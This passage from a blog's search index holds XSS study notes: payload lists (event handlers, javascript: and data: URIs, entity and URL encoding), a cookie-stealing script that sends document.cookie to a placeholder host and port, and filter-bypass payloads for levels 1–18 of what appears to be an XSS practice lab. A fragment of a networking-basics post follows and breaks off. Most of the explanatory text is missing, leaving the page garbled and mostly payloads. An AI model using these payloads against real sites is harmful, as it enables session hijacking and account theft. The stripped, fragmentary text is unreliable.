class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;</span><br><span class=\"line\">&#39;&gt;</span><br><span class=\"line\">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure>\n<p></p>\n<h2 id=\"0x03domxss\"><a href=\"#0x03domxss\" class=\"headerlink\" title=\"0x03domxss\"></a>0x03domxss</h2><p>urlxssurlxssxssxssurlxss</p>\n<p>dom</p>\n<p>dom</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>strip_tagshtml</p>\n<p>htmlspecialcharshtml</p>\n<h1 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"x\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(1)</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"1\"</span> <span class=\"attr\">onerror</span>=<span class=\"string\">eval(</span>\"<span class=\"attr\">alert</span>('<span class=\"attr\">xss</span>')\")&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:alert('xss')\"</span>&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">javascript:eval(alert(</span>'<span class=\"attr\">xss</span>'))&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript:aaa\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">\"alert(/xss/)\"</span>&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Base64<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class=\"line\"></span><br><span class=\"line\">urlencode<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class=\"line\"></span><br><span class=\"line\">HTML <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span>aa<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">eval(alert(</span>'<span class=\"attr\">xss</span>'))&gt;</span>bb<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">prompt(</span>'<span class=\"attr\">xss</span>')&gt;</span>cc<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"data:text/html,<span class=\"symbol\">&amp;lt;</span>script<span class=\"symbol\">&amp;gt;</span>alert('xss')<span class=\"symbol\">&amp;lt;</span>/script<span class=\"symbol\">&amp;gt;</span>\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"aaa\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>') /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">\"javascript<span class=\"symbol\">&amp;colon;</span>prompt<span class=\"symbol\">&amp;lpar;</span>`xss`<span class=\"symbol\">&amp;rpar;</span>\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>') <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">alert(</span>'<span class=\"attr\">xss</span>')&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">onmouseover</span>=<span class=\"string\">prompt(</span>'<span class=\"attr\">xss</span>') <span class=\"attr\">bad</span>=<span class=\"string\">\"\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">value</span>=<span class=\"string\">1</span> <span class=\"attr\">type</span>=<span class=\"string\">image</span> <span class=\"attr\">src</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"keyword\">var</span> img=<span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"img\"</span>);img.src=<span class=\"string\">\"http://xxx.xxx.xxx.xxx:1234/a?\"</span>+<span class=\"built_in\">escape</span>(<span class=\"built_in\">document</span>.cookie);</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">nc1234</span><br></pre></td></tr></table></figure>\n<h1 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h1><h2 id=\"js\"><a href=\"#js\" class=\"headerlink\" title=\"js\"></a>js</h2><p>JS</p>\n<ul>\n<li>a<code>\\141</code></li>\n<li>a<code>\\x61</code></li>\n<li>a<code>\\u0061</code></li>\n<li>C<code>\\n</code><code>\\r</code></li>\n</ul>\n<h2 id=\"HTML\"><a href=\"#HTML\" class=\"headerlink\" title=\"HTML\"></a>HTML</h2><p><strong></strong><br><code>&amp;</code><code>&lt;</code><code>&amp;1t;</code></p>\n<p><strong></strong></p>\n<p>ASCIIUnicode<code>&amp;#</code>;</p>\n<p><code>&lt;</code></p>\n<p><code>&lt;</code>(10)&amp;#60</p>\n<p><code>&lt;</code>(16)&amp;#x003c</p>\n<p><strong>URL</strong></p>\n<p>urlurl</p>\n<p>alerturl<code>%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>\n<p><strong>String.fromCharCode</strong></p>\n<p>alert<code>String.fromCharCode(97,108,101,114,116)</code></p>\n<h1 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h1><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure>\n<p>xss</p>\n<h2 id=\"level1\"><a href=\"#level1\" class=\"headerlink\" title=\"level1\"></a>level1</h2><p><img src=\"/2020/12/09/xss/image-20200821200652133.png\" alt=\"image-20200821200652133\"></p>\n<p>testh2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p><img src=\"/2020/12/09/xss/image-20200821201141420.png\" alt=\"image-20200821201141420\"></p>\n<p><img src=\"/2020/12/09/xss/image-20200821201207838.png\" alt=\"image-20200821201207838\"></p>\n<p>value<strong></strong></p>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class=\"line\">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h2><p><strong>&lt;&gt;,</strong></p>\n<p><img src=\"/2020/12/09/xss/image-20200821203827654.png\" alt=\"image-20200821203827654\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class=\"line\">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level4\"><a href=\"#level4\" class=\"headerlink\" title=\"level4\"></a>level4</h2><p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class=\"line\">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class=\"line\">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class=\"line\">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level5\"><a href=\"#level5\" class=\"headerlink\" title=\"level5\"></a>level5</h2><p>on<strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class=\"line\">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class=\"line\">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level6\"><a href=\"#level6\" class=\"headerlink\" title=\"level6\"></a>level6</h2><p>script  scr_ipt        on  o_n        src  sr_c        data  da_ta        href  hr_ef</p>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class=\"line\">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class=\"line\">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level7\"><a href=\"#level7\" class=\"headerlink\" title=\"level7\"></a>level7</h2><p>scriptonhref</p>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class=\"line\">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level8\"><a href=\"#level8\" class=\"headerlink\" title=\"level8\"></a>level8</h2><p>script,onsrcdatahrefvalue</p>\n<p> &lt;&gt;  % # &amp;  <strong>html</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class=\"line\">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure>\n<h2 id=\"level9\"><a href=\"#level9\" class=\"headerlink\" title=\"level9\"></a>level9</h2><p><strong>http://</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level10\"><a href=\"#level10\" class=\"headerlink\" title=\"level10\"></a>level10</h2><p></p>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class=\"line\">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level11\"><a href=\"#level11\" class=\"headerlink\" title=\"level11\"></a>level11</h2><p>11urlref1011</p>\n<p><img src=\"/2020/12/09/xss/image-20200822205648946.png\" alt=\"image-20200822205648946\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p>ref</p>\n<h2 id=\"level12\"><a href=\"#level12\" class=\"headerlink\" title=\"level12\"></a>level12</h2><p></p>\n<p>UA</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level13\"><a href=\"#level13\" class=\"headerlink\" title=\"level13\"></a>level13</h2><p>cookie</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level14\"><a href=\"#level14\" class=\"headerlink\" title=\"level14\"></a>level14</h2><p></p>\n<h2 id=\"level15\"><a href=\"#level15\" class=\"headerlink\" title=\"level15\"></a>level15</h2><p></p>\n<p><img src=\"/2020/12/09/xss/image-20200822213204305.png\" alt=\"image-20200822213204305\"></p>\n<p></p>\n<p><strong>ng-include</strong>  HTML </p>\n<p></p>\n<p><code>ng-include</code> </p>\n<p><strong></strong></p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>\n<p>srcng-include</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p></p>\n<h2 id=\"level16\"><a href=\"#level16\" class=\"headerlink\" title=\"level16\"></a>level16</h2><p></p>\n<p>%0d%0a</p>\n<p><strong>%0a\\n<br>%0d\\r</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class=\"line\">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"level17\"><a href=\"#level17\" class=\"headerlink\" title=\"level17\"></a>level17</h2><p>url</p>\n<p>src</p>\n<p>&lt;&gt;on</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>\n<h2 id=\"level18\"><a href=\"#level18\" class=\"headerlink\" title=\"level18\"></a>level18</h2><p>17</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- </span><br><span class=\"line\">- </span><br><span class=\"line\">- &lt;!----&gt;,--!&gt;</span><br><span class=\"line\">- &#x2F;&#x2F;</span><br><span class=\"line\">- &lt;!----&gt;htmlscript</span><br><span class=\"line\">-   S</span><br><span class=\"line\">-  %0a </span><br></pre></td></tr></table></figure>","categories":["web"],"tags":["web"]},{"title":"","url":"https://pz1o.top/2020/12/09//","content":"<p></p>\n<p></p>\n<p></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"TCP-IP\"><a href=\"#TCP-IP\" class=\"headerlink\" title=\"TCP/IP\"></a><strong>TCP/IP</strong></h2><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong></strong></td>\n</tr>\n<tr>\n<td><strong></strong></td>\n</tr>\n<tr>\n<td><strong></strong></td>\n</tr>\n<tr>\n<td><strong></strong></td>\n</tr>\n</tbody>\n</table>\n</div>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<h2 id=\"IP\"><a href=\"#IP\" class=\"headerlink\" title=\"IP\"></a>IP</h2><p>ip</p>\n<p></p>\n<p></p>\n<p>210.73.140.0</p>\n<p>                    2</p>\n<p>210.73.140.2</p>\n<p>323ABCIPIP</p>\n<p>1AIP1-126</p>\n<p>130</p>\n<p>2BIP128-191</p>\n<p>2210</p>\n<p>3CIP192-223</p>\n<p>31110</p>\n<p>4DIP224-239</p>\n<p>IP</p>\n<p>5EIP240-225</p>\n<p></p>\n<p>0.0.0.0255.255.255.255</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p> .com</p>\n<p> test.com</p>\n<p> test.cn.com</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png\" alt=\"image-20200609213455144\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png\" alt=\"image-20200609214339970\"></p>\n<h2 id=\"DNS\"><a href=\"#DNS\" class=\"headerlink\" title=\"DNS\"></a>DNS</h2><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png\" alt=\"image-20200609214938548\"></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h2><p>    </p>\n<p> </p>\n<p>Internet   </p>\n<p>IP</p>\n<p>Mac</p>\n<p>GGIP</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png\" alt=\"image-20200609224145835\"></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>ip</th>\n<th>ip</th>\n<th>mac</th>\n<th>mac</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>15.0.0.2</td>\n<td>13.0.0.2</td>\n<td>m4</td>\n<td>m5</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><strong>OSI</strong></p>\n<ul>\n<li></li>\n<li></li>\n<li> netstat -nb</li>\n<li>TCP UDP</li>\n<li> IP</li>\n<li></li>\n<li></li>\n</ul>\n<p><strong>OSI</strong></p>\n<ol>\n<li></li>\n<li>MACVLAN</li>\n<li>IP </li>\n<li></li>\n</ol>\n<p>ping</p>\n<p><strong>OSI</strong></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png\" alt=\"image-20200610122326325\"></li>\n</ol>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png\" alt=\"image-20200610122957433\"></p>\n<h2 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h2><h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p><strong></strong><strong></strong></p>\n<p></p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p><strong></strong></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png\" alt=\"image-20200611101252348\"></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png\" alt=\"image-20200611103259080\"></p>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>UTP</p>\n<p>STP</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<h3 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png\" alt=\"image-20200611121924344\"></p>\n<h3 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><h3 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h3><p>ADSL</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png\" alt=\"image-20200611122852820\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png\" alt=\"image-20200611123214486\"></p>\n<p></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png\" alt=\"image-20200611123435591\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png\" alt=\"image-20200611123546821\"></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png\" alt=\"image-20200615185534103\"></p>\n<p></p>\n<p></p>\n<p></p>\n<p>  mac </p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png\" alt=\"image-20200615190949900\"></p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>1.</p>\n<p>2.</p>\n<p>3.</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png\" alt=\"image-20200615194723467\"></p>\n<p><strong>101001001</strong>/11010</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png\" alt=\"image-20200615195101214\"></p>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p><strong></strong></p>\n<p>PPP</p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png\" alt=\"image-20200615195355465\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png\" alt=\"image-20200615201603443\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png\" alt=\"image-20200615195843590\"></p>\n<p><strong></strong></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png\" alt=\"image-20200615205445679\"></p>\n<h3 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>CSMA/CD</p>\n<p><strong></strong>MAC </p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png\" alt=\"image-20200615211139871\"></p>\n<p><img src=\"/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png\" alt=\"image-20200615211817436\"></p>\n<p><img 